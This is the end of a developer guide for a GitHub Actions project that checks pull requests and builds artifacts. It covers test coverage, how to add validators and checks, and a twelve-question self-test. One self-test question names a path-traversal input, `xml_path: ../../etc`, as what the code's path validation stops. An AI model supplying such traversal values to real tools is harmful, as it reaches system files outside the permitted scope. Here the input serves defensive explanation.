| `build-action/main.py`, `utils/build_plans.py` | `tests/test_build_action.py` | Backend plan, frontend plan, unknown type |
| Both `action.yml` files | `.github/workflows/ci.yml` | The real actions on GitHub: 11 PR-check scenarios and 2 build-action runs |

The fixture folders under `tests/fixtures/` are shared by the unit tests, the CI scenarios and manual runs.

---

## 11. How the folder grows

| Goal | Files to touch |
|---|---|
| New artifact type, e.g. `node` | New `utils/node_validator.py` with `validate_node(root, config) -> CheckResult`; one entry in `VALIDATORS` (`main.py`); one entry in `BUILD_PLANS` (`build_plans.py`); fixtures and tests |
| New PR check, e.g. license headers | A function returning `CheckResult`; one entry in `CHECKS` (`main.py`). It gets its own `result_map` key and takes part in `block_merge` automatically |
| Roll out a new check without blocking | Return `CheckResult(..., required=False)` until it's trusted |
| New setting | Add an input to `action.yml`, pass it as a `PRCHECK_*` variable, read it in `parse_args`, add it to `config` |

Nothing in `result_utils.py`, `fs_utils.py` or the reporting functions has to change for any of these. That's the point of the split: the foundation stays still while checks are added on top.

---

## 12. Quick self-test

1. Which file does GitHub read first when a workflow says `uses: .../prcheck-utils-action@v1`? (5.1)
2. Why are inputs passed as environment variables? (5.1)
3. Where is the artifact type decided, and what does it look at? (5.2, `run_artifact_consistency`)
4. What would you change to support a new artifact type? (11)
5. Which function decides `block_merge`, and why does `"true"` (a string) not count as passed? (5.4)
6. Why does `extract_artifact_id` only look at direct children of `<project>`? (5.6)
7. What stops `xml_path: ../../etc`? (5.5, `resolve_within`)
8. Why does the action exit 0 when the check fails, and who fails the job instead? (5.2 `main`, 8)
9. How does an error end up attached to a file in the PR's *Files changed* tab? (5.2 `emit_annotations`, 5.7 step 8)
10. Why are the build action's modules tested only as a separate process? (6.4)
11. Name the four places the PR-check action reports to. (4, step 5-8)
12. What happens downstream when `block_merge` is `true`? (8)
